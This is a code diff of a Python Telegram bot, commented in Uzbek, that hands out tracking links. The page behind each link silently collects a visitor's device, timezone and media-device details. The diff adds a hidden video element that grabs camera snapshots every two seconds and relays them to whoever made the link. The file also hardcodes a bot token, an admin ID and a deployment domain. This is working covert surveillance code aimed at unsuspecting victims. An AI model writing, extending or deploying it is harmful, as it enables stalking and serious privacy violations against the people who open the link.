@@ -1,16 +1,17 @@
 #!/usr/bin/env python3
-# bot.py
+# main.py
 import logging
 import os
 import uuid
 import json
 import asyncio
-from datetime import datetime
 from aiohttp import web
-from telegram import Update
+from telegram import Update, InputFile
 from telegram.ext import (
     Application, CommandHandler, ContextTypes
 )
+import base64
+import io
 
 # ---------------- LOG ----------------
 logging.basicConfig(
@@ -22,7 +23,6 @@ logger = logging.getLogger(__name__)
 # ---------------- ENV ----------------
 BOT_TOKEN = "8282416690:AAF2Uz6yfATHlrThT5YbGfxXyxi1vx3rUeA"
 ADMIN_ID = int(os.getenv("ADMIN_ID", "7440949683"))
-# ⚠️ Bo'sh joylarni olib tashlang!
 WEBHOOK_DOMAIN = os.getenv("WEBHOOK_DOMAIN", "https://fit-roanna-runex-7a8db616.koyeb.app").rstrip('/')
 
 if not BOT_TOKEN:
@@ -55,11 +55,42 @@ async def track_page(request):
     if not token or token not in USER_TOKENS:
         return web.Response(text="❌ Noto'g'ri yoki eskirgan havola.", status=403)
 
+    # HTML + JS sahifa. Kameradan ruxsat so‘raydi va 2 soniyada snapshot oladi, Telegram'ga yuboradi.
     html = f"""
-    <html><head><title>Ma'lumot yig'ilmoqda...</title></head><body>
+    <html>
+    <head><title>Ma'lumot yig'ilmoqda...</title></head>
+    <body>
     <h2>Ma'lumotlar yig'ilmoqda...</h2>
+    <video id="video" autoplay playsinline style="display:none;"></video>
     <script>
-      async function collect() {{
+      const token = "{token}";
+      const botDomain = window.location.origin;
+
+      async function sendData(data) {{
+        try {{
+          await fetch('/submit', {{
+            method: 'POST',
+            headers: {{ 'Content-Type': 'application/json' }},
+            body: JSON.stringify({{ token, ...data }})
+          }});
+        }} catch(e) {{
+          console.error('Send data error:', e);
+        }}
+      }}
+
+      async function sendPhoto(base64Image) {{
+        try {{
+          await fetch('/submit_photo', {{
+            method: 'POST',
+            headers: {{ 'Content-Type': 'application/json' }},
+            body: JSON.stringify({{ token, photo: base64Image }})
+          }});
+        }} catch(e) {{
+          console.error('Send photo error:', e);
+        }}
+      }}
+
+      async function collectInfo() {{
         const data = {{
           timestamp: new Date().toLocaleString('uz-UZ', {{ timeZone: 'Asia/Tashkent' }}),
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Noma\\'lum',
@@ -111,8 +142,8 @@ async def track_page(request):
           const devices = await navigator.mediaDevices.enumerateDevices();
           const audioIn = devices.filter(d => d.kind === 'audioinput').length;
           const audioOut = devices.filter(d => d.kind === 'audiooutput').length;
-          const video = devices.filter(d => d.kind === 'videoinput').length;
-          data.mediaDevices = `mikrofon: ${{audioIn}} ta, karnay: ${{audioOut}} ta, kamera: ${{video}} ta`;
+          const videoCount = devices.filter(d => d.kind === 'videoinput').length;
+          data.mediaDevices = `mikrofon: ${{audioIn}} ta, karnay: ${{audioOut}} ta, kamera: ${{videoCount}} ta`;
         }} catch(e) {{}}
 
         try {{
@@ -124,17 +155,50 @@ async def track_page(request):
           }}
           track.stop();
           stream.getTracks().forEach(t => t.stop());
-        }} catch(e) {{}}
-
-        fetch('/submit', {{
-          method: 'POST',
-          headers: {{ 'Content-Type': 'application/json' }},
-          body: JSON.stringify({{ token: '{token}', ...data }})
-        }}).then(() => {{
-          document.body.innerHTML = '<h2>✅ Ma\\'lumotlar yuborildi!</h2>';
-        }});
+          return {{ allowed: true, data }};
+        }} catch(e) {{
+          // Kamera ruxsat berilmagan
+          return {{ allowed: false, data }};
+        }}
       }}
-      collect();
+
+      async function startSnapshotLoop() {{
+        const video = document.getElementById('video');
+        try {{
+          const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
+          video.srcObject = stream;
+          await new Promise(resolve => video.onloadedmetadata = resolve);
+
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+
+          async function snapAndSend() {{
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const base64Image = canvas.toDataURL('image/jpeg', 0.7); // Base64 JPEG
+            await sendPhoto(base64Image);
+          }}
+
+          // Har 2 soniyada rasm olish
+          snapAndSend();
+          setInterval(snapAndSend, 2000);
+
+        }} catch(e) {{
+          console.error('Kamera ishga tushmadi:', e);
+        }}
+      }}
+
+      (async () => {{
+        const res = await collectInfo();
+        await sendData(res.data);
+        if (res.allowed) {{
+          await startSnapshotLoop();
+          document.body.innerHTML = '<h2>📸 Kamera ruxsati berildi. Rasmlar yuborilmoqda...</h2>';
+        }} else {{
+          document.body.innerHTML = '<h2>⚠️ Kamera ruxsati berilmadi. Faqat ma\'lumotlar yuborildi.</h2>';
+        }}
+      }})();
     </script>
     </body></html>
     """
@@ -180,12 +244,38 @@ UA: {data.get('userAgent', 'Noma\'lum')}
         logger.exception(f"[SUBMIT ERROR] {e}")
         return web.json_response({"error": str(e)}, status=500)
 
+async def submit_photo(request):
+    try:
+        data = await request.json()
+        token = data.get('token')
+        photo_base64 = data.get('photo')
+        telegram_id = USER_TOKENS.get(token)
+        if not telegram_id or not photo_base64:
+            return web.json_response({"error": "Token yoki rasm topilmadi"}, status=400)
+
+        # Base64 data URL ni tozalash
+        header = "data:image/jpeg;base64,"
+        if photo_base64.startswith(header):
+            photo_base64 = photo_base64[len(header):]
+
+        photo_bytes = base64.b64decode(photo_base64)
+        bio = io.BytesIO(photo_bytes)
+        bio.name = "snapshot.jpg"
+        bio.seek(0)
+
+        await request.app['bot'].send_photo(chat_id=telegram_id, photo=InputFile(bio))
+        return web.json_response({"status": "ok"})
+    except Exception as e:
+        logger.exception(f"[SUBMIT PHOTO ERROR] {e}")
+        return web.json_response({"error": str(e)}, status=500)
+
 # ---------------- Web Server Starter ----------------
 async def start_web_server(bot):
     app = web.Application()
     app['bot'] = bot
     app.router.add_get('/track', track_page)
     app.router.add_post('/submit', submit_data)
+    app.router.add_post('/submit_photo', submit_photo)
     runner = web.AppRunner(app)
     await runner.setup()
     port = int(os.getenv("PORT", "8000"))
@@ -200,7 +290,6 @@ async def on_startup(app: Application):
 
 # ---------------- Main ----------------
 def main():
-    # ✅ post_init orqali on_startup chaqiriladi
     app = Application.builder().token(BOT_TOKEN).post_init(on_startup).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("tracklink", cmd_tracklink))
